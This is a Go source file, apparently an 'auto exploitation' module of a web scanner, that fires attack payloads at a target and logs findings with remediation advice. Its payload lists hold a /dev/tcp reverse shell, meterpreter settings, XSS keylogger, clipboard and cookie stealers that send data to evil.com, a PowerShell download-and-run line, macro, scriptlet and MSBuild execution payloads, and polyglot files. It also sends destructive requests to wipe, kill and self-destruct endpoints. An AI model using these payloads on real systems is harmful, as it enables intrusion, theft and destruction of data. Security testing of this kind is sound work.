package strike

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
)

type StrikeModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *StrikeModule) ID() string   { return "strike" }
func (m *StrikeModule) Name() string { return "Strike - Auto Exploitation Module" }
func (m *StrikeModule) Description() string {
	return "Polymorphic reverse shell detection, XSS browser pwn, dropper/stager, logic bombs, polyglot payloads, and C2 channel testing"
}
func (m *StrikeModule) Severity() models.Severity { return models.Critical }

func (m *StrikeModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *StrikeModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	findings = append(findings, m.checkShellEndpoints(ctx, target)...)
	findings = append(findings, m.checkXSStoRCE(ctx, target)...)
	findings = append(findings, m.checkDropper(ctx, target)...)
	findings = append(findings, m.checkLogicBomb(ctx, target)...)
	findings = append(findings, m.checkPolyglot(ctx, target)...)

	return findings, nil
}

func (m *StrikeModule) checkShellEndpoints(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	shellPaths := []string{
		"/shell", "/reverse", "/connectback", "/callback", "/payload",
		"/stager", "/dropper", "/agent",
	}
	payloads := []string{
		`{"type":"reverse","host":"127.0.0.1","port":4444}`,
		`{"cmd":"/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}`,
		`{"os":"linux","arch":"amd64","format":"elf"}`,
		`{"type":"bind","port":8080}`,
		`{"type":"meterpreter","payload":"windows/x64/meterpreter/reverse_tcp"}`,
	}

shellLoop:
	for _, path := range shellPaths {
		fullURL := strings.TrimRight(target.URL, "/") + path

		for _, pl := range payloads {
			resp, err := m.client.Post(fullURL, pl)
			if err != nil {
				continue
			}

			for _, check := range []string{"shell", "reverse", "connect", "payload", "binary", "elf", "exe", "tcp", "meterpreter", "stager"} {
				if strings.Contains(strings.ToLower(resp.Body), check) || resp.StatusCode == 200 {
					findings = append(findings, &models.Finding{
						Title:       "Strike - Reverse Shell Generator",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         fullURL,
						Payload:     pl,
						Evidence:    fmt.Sprintf("Shell generation endpoint responds (status: %d, matched: %s)", resp.StatusCode, check),
						Description: fmt.Sprintf("Endpoint %s appears to be a reverse shell or payload generator. Can generate polymorphic shells.", path),
						Remediation: "Block shell generation tools. Implement WAF rules for shellcode patterns. Monitor for outbound reverse connections.",
						CWEID:       "CWE-94",
						ModuleID:    "strike",
					})
					continue shellLoop
				}
			}
		}
	}

	c2Channels := []string{"/grpc", "/doh", "/dns", "/ws", "/websocket", "/discord", "/telegram", "/bot"}
	for _, c2Path := range c2Channels {
		fullURL := strings.TrimRight(target.URL, "/") + c2Path
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		status := resp.StatusCode
		if status == 200 || status == 101 || status == 204 {
			if strings.Contains(respBody, "c2") || strings.Contains(respBody, "beacon") || strings.Contains(respBody, "command") || strings.Contains(respBody, "control") {
				findings = append(findings, &models.Finding{
					Title:       "Strike - C2 Channel Detected",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("C2 channel endpoint at %s (status: %d)", c2Path, status),
					Description: fmt.Sprintf("C2 channel endpoint discovered at %s. May use gRPC, DoH, WebSocket, or messaging protocols.", c2Path),
					Remediation: "Block C2 infrastructure. Implement network segmentation. Monitor for anomalous outbound connections.",
					CWEID:       "CWE-284",
					ModuleID:    "strike",
				})
			}
		}
	}

	evasionPaths := []string{"/amsi", "/etw", "/syscall", "/ntdll", "/bypass"}
	for _, evPath := range evasionPaths {
		fullURL := strings.TrimRight(target.URL, "/") + evPath
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "amsi") || strings.Contains(respBody, "etw") || strings.Contains(respBody, "syscall") || strings.Contains(respBody, "ntdll") || strings.Contains(respBody, "bypass") || strings.Contains(respBody, "patch") {
			findings = append(findings, &models.Finding{
				Title:       "Strike - Evasion Technique Endpoint",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("Evasion technique endpoint at %s (status: %d)", evPath, resp.StatusCode),
				Description: fmt.Sprintf("Endpoint at %s exposes evasion techniques (AMSI bypass, ETW patching, direct syscall, NTDLL unhooking).", evPath),
				Remediation: "Block evasion tools. Monitor for AMSI/ETW tampering. Use behavioral detection.",
				CWEID:       "CWE-284",
				ModuleID:    "strike",
			})
		}
	}

	persistencePaths := []string{"/persist", "/wmi", "/scheduled", "/registry", "/service", "/startup"}
	for _, persPath := range persistencePaths {
		fullURL := strings.TrimRight(target.URL, "/") + persPath
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "persist") || strings.Contains(respBody, "wmi") || strings.Contains(respBody, "scheduled") || strings.Contains(respBody, "registry") || strings.Contains(respBody, "startup") || strings.Contains(respBody, "service") {
			findings = append(findings, &models.Finding{
				Title:       "Strike - Persistence Mechanism Endpoint",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("Persistence endpoint at %s (status: %d)", persPath, resp.StatusCode),
				Description: fmt.Sprintf("Endpoint at %s implements persistence mechanisms (WMI, scheduled tasks, registry, kernel params).", persPath),
				Remediation: "Monitor for persistence mechanisms. Implement EDR detection rules for WMI and scheduled task abuse.",
				CWEID:       "CWE-284",
				ModuleID:    "strike",
			})
		}
	}

	reversePaths := []string{"/connect", "/tunnel", "/forward", "/proxy", "/socks"}
	for _, revPath := range reversePaths {
		fullURL := strings.TrimRight(target.URL, "/") + revPath
		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "connect") || strings.Contains(respBody, "tunnel") || strings.Contains(respBody, "forward") || strings.Contains(respBody, "proxy") || strings.Contains(respBody, "socks") {
			findings = append(findings, &models.Finding{
				Title:       "Strike - Reverse Connection / Tunneling",
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("Reverse connection/tunneling endpoint at %s (status: %d)", revPath, resp.StatusCode),
				Description: fmt.Sprintf("Endpoint at %s supports reverse connections or tunneling. May be used for egress bypass.", revPath),
				Remediation: "Block unauthorized tunneling tools. Implement egress filtering. Monitor for reverse connection attempts.",
				CWEID:       "CWE-284",
				ModuleID:    "strike",
			})
		}
	}

	return findings
}

func (m *StrikeModule) checkXSStoRCE(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	xss2rcePayloads := []struct {
		name    string
		payload string
		check   string
	}{
		{
			name:    "SessionRiding",
			payload: `<script>fetch('/admin/users/create',{method:'POST',body:new URLSearchParams({username:'hacker',role:'admin'})})</script>`,
			check:   "admin",
		},
		{
			name:    "CachePoisoning",
			payload: `<script>fetch('/cdn/jquery.js',{method:'PUT',body:'// backdoored'})</script>`,
			check:   "jquery",
		},
		{
			name:    "Keylogger",
			payload: `<script>document.addEventListener('keydown',e=>fetch('/log?k='+e.key))</script>`,
			check:   "keydown",
		},
		{
			name:    "ClipboardHijack",
			payload: `<script>navigator.clipboard.readText().then(t=>fetch('/clip?d='+t))</script>`,
			check:   "clipboard",
		},
		{
			name:    "WebRTCProxy",
			payload: `<script>var pc=new RTCPeerConnection({iceServers:[{urls:'stun:evil.com:3478'}]});pc.createOffer().then(d=>pc.setLocalDescription(d))</script>`,
			check:   "RTCPeerConnection",
		},
		{
			name:    "BrowserBotnet",
			payload: `<script>function beacon(){fetch('/beacon?data='+btoa(JSON.stringify({url:location.href,cookie:document.cookie})))};setInterval(beacon,5000)</script>`,
			check:   "beacon",
		},
		{
			name:    "HistorySteal",
			payload: `<script>for(var k in window){if(window[k].name=='chrome')fetch('/steal?k='+k)}</script>`,
			check:   "steal",
		},
		{
			name:    "PortScan",
			payload: `<script>for(var i=0;i<65535;i++){fetch('http://localhost:'+i,{mode:'no-cors'}).then(()=>fetch('/open?p='+i))}</script>`,
			check:   "open",
		},
	}

	for _, jp := range xss2rcePayloads {
		testURL := target.URL + "?q=" + base64.URLEncoding.EncodeToString([]byte(jp.payload))
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		if strings.Contains(resp.Body, jp.check) {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("Strike - XSS Browser Pwn (%s)", jp.name),
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         testURL,
				Payload:     jp.payload[:minS(len(jp.payload), 100)],
				Evidence:    fmt.Sprintf("XSS to RCE payload reflected: %s", jp.check),
				Description: fmt.Sprintf("XSS can be escalated to full browser pwn via %s technique. User browser becomes a bot node.", jp.name),
				Remediation: "Implement strict CSP. Use XSS protection mechanisms. Never trust user input in script contexts.",
				CWEID:       "CWE-79",
				ModuleID:    "strike",
			})
		}
	}

	reflectPaths := []string{"/reflect", "/xss", "/echo", "/debug", "/api/echo", "/api/debug", "/search", "/query"}
	for _, reflectPath := range reflectPaths {
		fullURL := strings.TrimRight(target.URL, "/") + reflectPath
		testPayload := `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
		resp, err := m.client.Post(fullURL, "q="+base64.URLEncoding.EncodeToString([]byte(testPayload)))
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if strings.Contains(respBody, "onerror") || strings.Contains(respBody, "document.cookie") || strings.Contains(respBody, "evil.com") {
			findings = append(findings, &models.Finding{
				Title:       "Strike - XSS Reflection Point",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Payload:     testPayload,
				Evidence:    fmt.Sprintf("XSS payload reflected at %s (status: %d)", reflectPath, resp.StatusCode),
				Description: fmt.Sprintf("XSS payload reflected at %s. Can be escalated to session hijacking, cache poisoning, LAN proxy via WebRTC.", reflectPath),
				Remediation: "Implement context-aware output encoding. Use CSP headers. Validate and sanitize all user input.",
				CWEID:       "CWE-79",
				ModuleID:    "strike",
			})
		}
	}

	return findings
}

func (m *StrikeModule) checkDropper(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	dropperPaths := []string{
		"/dropper", "/stager", "/payload", "/download", "/stage",
		"/loader", "/reflect", "/execute", "/run", "/exec",
		"/inject", "/patch", "/update", "/deploy", "/install",
		"/plugin", "/module", "/extension", "/component",
	}
	dropperPayloads := []struct {
		name     string
		payload  string
		method   string
		endpoint string
	}{
		{name: "ShellcodeLoader", payload: `{"url":"http://evil.com/payload.bin","format":"raw","arch":"x64"}`, method: "POST", endpoint: "/dropper"},
		{name: "PEStager", payload: `{"url":"http://evil.com/beacon.dll","type":"dll","reflect":true}`, method: "POST", endpoint: "/stager"},
		{name: "PowerShellDownload", payload: `IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')`, method: "POST", endpoint: "/download"},
		{name: "MacroLoader", payload: `Sub AutoOpen(): Shell("powershell -e encoded_payload")`, method: "POST", endpoint: "/loader"},
		{name: "ShellcodeInject", payload: `{"pid":1234,"technique":"CreateRemoteThread","shellcode":"base64encoded"}`, method: "POST", endpoint: "/inject"},
		{name: "ReflectiveDLL", payload: `{"dll":"beacon.dll","function":"DllMain","method":"reflective"}`, method: "POST", endpoint: "/reflect"},
		{name: "MemoryModule", payload: `{"data":"base64encoded","type":"exe","entry":"main"}`, method: "POST", endpoint: "/module"},
		{name: "ProcessHollowing", payload: `{"target":"svchost.exe","payload":"base64encoded","technique":"hollow"}`, method: "POST", endpoint: "/execute"},
		{name: "Pingback", payload: `{"url":"http://evil.com/beacon","interval":60,"jitter":20}`, method: "POST", endpoint: "/payload"},
		{name: "Scriptlet", payload: `<?XML version="1.0"?><scriptlet><registration progid="Test" classid="{00000000-0000-0000-0000-000000000000}"><script language="JScript">new ActiveXObject("WScript.Shell").Run("calc");</script></registration></scriptlet>`, method: "POST", endpoint: "/stage"},
	}

	endpointChecks := []string{"dropper", "stager", "loader", "payload", "reflect", "inject", "hollow", "shellcode", "download", "beacon"}
	methodChecks := []string{"POST", "PUT", "PATCH"}

	for _, path := range dropperPaths {
		fullURL := strings.TrimRight(target.URL, "/") + path

		for _, method := range methodChecks {
			resp, err := m.client.DoRaw(method, fullURL, map[string]string{"Content-Type": "application/json"}, `{"test":true}`)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			for _, check := range endpointChecks {
				if strings.Contains(respBody, check) {
					findings = append(findings, &models.Finding{
						Title:       "Strike - Dropper Endpoint",
						Severity:    models.Critical,
						Confidence:  models.MediumConfidence,
						URL:         fullURL,
						Evidence:    fmt.Sprintf("Dropper endpoint at %s (method: %s, status: %d, matched: %s)", path, method, resp.StatusCode, check),
						Description: fmt.Sprintf("Endpoint %s accepts %s requests and may be a dropper/stager. Can deliver payloads, execute shellcode, or load reflective DLLs.", path, method),
						Remediation: "Block dropper/stager endpoints. Implement file upload scanning. Monitor for process injection and reflective loading.",
						CWEID:       "CWE-94",
						ModuleID:    "strike",
					})
					goto nextDropperPath
				}
			}
		}

		for _, dp := range dropperPayloads {
			fullEndpoint := strings.TrimRight(target.URL, "/") + dp.endpoint
			resp, err := m.client.Post(fullEndpoint, dp.payload)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			if resp.StatusCode == 200 {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("Strike - %s Accepted", dp.name),
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         fullEndpoint,
					Payload:     dp.payload[:minS(len(dp.payload), 120)],
					Evidence:    fmt.Sprintf("Dropper payload '%s' accepted at %s (status: %d)", dp.name, dp.endpoint, resp.StatusCode),
					Description: fmt.Sprintf("Endpoint at %s accepted '%s' payload. Can be used for remote code execution, shellcode loading, or reflective DLL injection.", dp.endpoint, dp.name),
					Remediation: "Implement integrity checks. Use application allowlisting. Monitor for suspicious process creation and injection APIs.",
					CWEID:       "CWE-94",
					ModuleID:    "strike",
				})
			} else {
				for _, check := range endpointChecks {
					if strings.Contains(respBody, check) {
						findings = append(findings, &models.Finding{
							Title:       fmt.Sprintf("Strike - Dropper Response (%s)", dp.name),
							Severity:    models.High,
							Confidence:  models.LowConfidence,
							URL:         fullEndpoint,
							Payload:     dp.name,
							Evidence:    fmt.Sprintf("Dropper '%s' endpoint responded with dropper-related content (matched: %s)", dp.name, check),
							Description: fmt.Sprintf("Endpoint %s contains dropper-related content despite non-200 status. May be a disguised dropper.", dp.endpoint),
							Remediation: "Investigate and block payload delivery mechanisms. Monitor for outbound connections to staging servers.",
							CWEID:       "CWE-94",
							ModuleID:    "strike",
						})
						break
					}
				}
			}
		}

	nextDropperPath:
	}

	msBuildPaths := []string{"/msbuild", "/csc", "/jsc", "/vbc", "/build", "/compile"}
	for _, mbp := range msBuildPaths {
		fullURL := strings.TrimRight(target.URL, "/") + mbp
		resp, err := m.client.Post(fullURL, `<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="Exec"><Exec Command="calc"/></Target></Project>`)
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 {
			findings = append(findings, &models.Finding{
				Title:       "Strike - MSBuild / Code Execution Endpoint",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         fullURL,
				Evidence:    fmt.Sprintf("MSBuild/code compilation endpoint at %s (status: %d)", mbp, resp.StatusCode),
				Description: fmt.Sprintf("Endpoint at %s accepts MSBuild projects or code compilation. Can be abused for lateral movement and payload delivery.", mbp),
				Remediation: "Block MSBuild and code compilation tools on workstations. Restrict build tools to build servers only.",
				CWEID:       "CWE-94",
				ModuleID:    "strike",
			})
		}
	}

	return findings
}

func (m *StrikeModule) checkLogicBomb(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	selfDestructPaths := []string{
		"/self-destruct", "/shutdown", "/kill", "/die", "/panic", "/crash",
		"/exit", "/emergency-stop", "/halt", "/nuke", "/destroy", "/wipe",
		"/cleanup", "/reset", "/factory-reset", "/terminate", "/abort",
		"/__kill", "/__destroy", "/__panic", "/emergency", "/stop",
	}

	for _, path := range selfDestructPaths {
		fullURL := strings.TrimRight(target.URL, "/") + path

		resp, err := m.client.Get(fullURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if resp.StatusCode == 200 || resp.StatusCode == 204 || resp.StatusCode == 202 {
			if strings.Contains(respBody, "self") || strings.Contains(respBody, "destroy") || strings.Contains(respBody, "shutdown") ||
				strings.Contains(respBody, "kill") || strings.Contains(respBody, "halt") || strings.Contains(respBody, "nuke") ||
				strings.Contains(respBody, "wipe") || strings.Contains(respBody, "panic") || strings.Contains(respBody, "crash") ||
				resp.StatusCode == 204 {
				findings = append(findings, &models.Finding{
					Title:       "Strike - Logic Bomb / Self-Destruct Endpoint",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("Self-destruct endpoint at %s (status: %d)", path, resp.StatusCode),
					Description: fmt.Sprintf("Endpoint at %s appears to be a self-destruct, kill switch, or logic bomb trigger. Could cause system shutdown, data wipe, or crash.", path),
					Remediation: "Remove self-destruct endpoints from production. Implement authentication for destructive actions. Audit code for kill switch patterns.",
					CWEID:       "CWE-284",
					ModuleID:    "strike",
				})
			}
		}
	}

	methods := []string{"POST", "DELETE", "PUT"}
	for _, method := range methods {
		for _, path := range selfDestructPaths {
			fullURL := strings.TrimRight(target.URL, "/") + path
			resp, err := m.client.DoRaw(method, fullURL, map[string]string{"Content-Type": "application/json"}, `{"confirm":true,"reason":"test"}`)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 || resp.StatusCode == 204 || resp.StatusCode == 202 {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("Strike - Logic Bomb via %s", method),
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("Self-destructive action accepted via %s (status: %d)", method, resp.StatusCode),
					Description: fmt.Sprintf("Endpoint %s accepted a destructive %s request. May trigger system shutdown, data wipe, or crash.", path, method),
					Remediation: "Require multi-factor authentication for destructive operations. Implement safe rollback mechanisms.",
					CWEID:       "CWE-284",
					ModuleID:    "strike",
				})
			}
		}
	}

	crashTimeout := 5 * time.Second
	crashPaths := []string{"/crash", "/oom", "/infinite", "/loop", "/hang"}
	for _, path := range crashPaths {
		fullURL := strings.TrimRight(target.URL, "/") + path
		start := time.Now()
		resp, err := m.client.Get(fullURL)
		elapsed := time.Since(start)
		if err != nil || elapsed >= crashTimeout {
			if elapsed >= crashTimeout {
				findings = append(findings, &models.Finding{
					Title:       "Strike - Crash / Hang Endpoint",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         fullURL,
					Evidence:    fmt.Sprintf("Endpoint %s caused timeout after %v (threshold: %v)", path, elapsed, crashTimeout),
					Description: fmt.Sprintf("Endpoint %s caused request hang or crash. May be a logic bomb or infinite loop trigger.", path),
					Remediation: "Remove crash-inducing endpoints. Implement request timeouts. Fuzz test for infinite loops.",
					CWEID:       "CWE-835",
					ModuleID:    "strike",
				})
			}
		} else {
			_ = resp
		}
	}

	return findings
}

func (m *StrikeModule) checkPolyglot(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	polyglotPayloads := []struct {
		name    string
		payload string
		checks  []string
	}{
		{
			name:    "GIF+JS+XSS",
			payload: "GIF89a/*<svg onload=alert(1)>*/=1;require(['fs']).readFile('/etc/passwd',console.log)",
			checks:  []string{"GIF89a", "onload", "alert(1)"},
		},
		{
			name:    "PDF+HTML",
			payload: "%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n<html><script>alert(1)</script></html>",
			checks:  []string{"%PDF-1.4", "alert(1)"},
		},
		{
			name:    "JPEG+JS",
			payload: "\xFF\xD8\xFF\xE0/*\n<script>alert(1)</script>\n*/",
			checks:  []string{string([]byte{0xFF, 0xD8, 0xFF, 0xE0}), "alert(1)"},
		},
		{
			name:    "ZIP+JS",
			payload: "PK\x03\x04\x14\x00\x00\x00\x00\x00<script>alert(1)</script>",
			checks:  []string{"PK", "alert(1)"},
		},
		{
			name:    "XML+HTML+JS",
			payload: "<?xml version=\"1.0\"?><html><script>alert(1)</script></html>",
			checks:  []string{"<?xml", "alert(1)"},
		},
		{
			name:    "SVG+XSS",
			payload: "<?xml version=\"1.0\"?><svg onload=\"alert(1)\" xmlns=\"http://www.w3.org/2000/svg\">",
			checks:  []string{"svg", "onload", "alert(1)"},
		},
		{
			name:    "MultipartPolyglot",
			payload: "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.gif\"\r\nContent-Type: image/gif\r\n\r\nGIF89a<script>alert(1)</script>\r\n------WebKitFormBoundary--",
			checks:  []string{"GIF89a", "alert(1)"},
		},
	}

	for _, pp := range polyglotPayloads {
		testURL := target.URL + "?q=" + base64.URLEncoding.EncodeToString([]byte(pp.payload))
		resp, err := m.client.Get(testURL)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		matchedAll := true
		for _, check := range pp.checks {
			if !strings.Contains(respBody, strings.ToLower(check)) {
				matchedAll = false
				break
			}
		}

		if matchedAll {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("Strike - Polyglot Payload Reflection (%s)", pp.name),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         testURL,
				Payload:     pp.payload[:minS(len(pp.payload), 120)],
				Evidence:    fmt.Sprintf("Polyglot payload '%s' fully reflected in response", pp.name),
				Description: fmt.Sprintf("Polyglot payload '%s' reflected, indicating multiple interpretation contexts. Can bypass content-type filters, WAF, and validation logic.", pp.name),
				Remediation: "Use proper Content-Type headers. Implement context-aware output encoding. Validate file upload magic bytes and content-type consistency.",
				CWEID:       "CWE-79",
				ModuleID:    "strike",
			})
		}
	}

	postPolyglotPaths := []string{"/upload", "/file", "/api/upload", "/media", "/api/file", "/api/attach", "/import", "/api/import"}
	for _, ppPath := range postPolyglotPaths {
		fullURL := strings.TrimRight(target.URL, "/") + ppPath
		boundary := "----Boundary7MA4YWxkTrZu0gW"
		body := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.gif\"\r\nContent-Type: image/gif\r\n\r\nGIF89a<script>alert(1)</script>\r\n--%s--", boundary, boundary)

		req := fanghttp.NewRequest("POST", fullURL)
		req.Body = body
		req.Headers["Content-Type"] = "multipart/form-data; boundary=" + boundary

		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}

		respBody := strings.ToLower(resp.Body)
		if resp.StatusCode == 200 && (strings.Contains(respBody, "gif89a") || strings.Contains(respBody, "alert")) {
			findings = append(findings, &models.Finding{
				Title:       "Strike - Polyglot File Upload",
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Payload:     "GIF+JS Polyglot via multipart upload",
				Evidence:    fmt.Sprintf("Polyglot GIF+JS upload accepted at %s (status: %d)", ppPath, resp.StatusCode),
				Description: "Polyglot file upload accepted. GIF+JS polyglot can bypass content-type filters and deliver XSS.",
				Remediation: "Validate file magic bytes match Content-Type and extension. Scan uploaded content for scripts.",
				CWEID:       "CWE-79",
				ModuleID:    "strike",
			})
		}
	}

	return findings
}

func minS(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func init() {
	engine.GetRegistry().Register(&StrikeModule{})
}
